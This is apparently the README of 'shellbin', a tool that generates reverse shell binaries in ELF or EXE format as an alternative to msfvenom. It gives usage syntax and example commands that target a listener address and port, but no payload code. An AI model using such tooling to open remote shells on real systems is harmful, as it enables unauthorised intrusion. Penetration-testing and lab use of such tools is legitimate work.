# shellbin
Auto Reverse Shell Binary Generator

Auto generate reverse shell binary

if you can't use msfvenom, maybe this script is so usefuly.

they can generate as elf or exe format with out msfvenom

Usage:

     shellbin <lhost> <lport> <format>

Example:

     ./shellbin 192.168.0.4 1337 exe
     ./shellbin 192.168.0.4 1337 elf

SetUp:
  
     if root user      :  python3 setup.py
     if not a root user:  sudo python3 setup.py


Auto generate as "shell.c" "shell.cpp" and "shell.elf" "shell.exe"
So becareful to current files name on working directory 
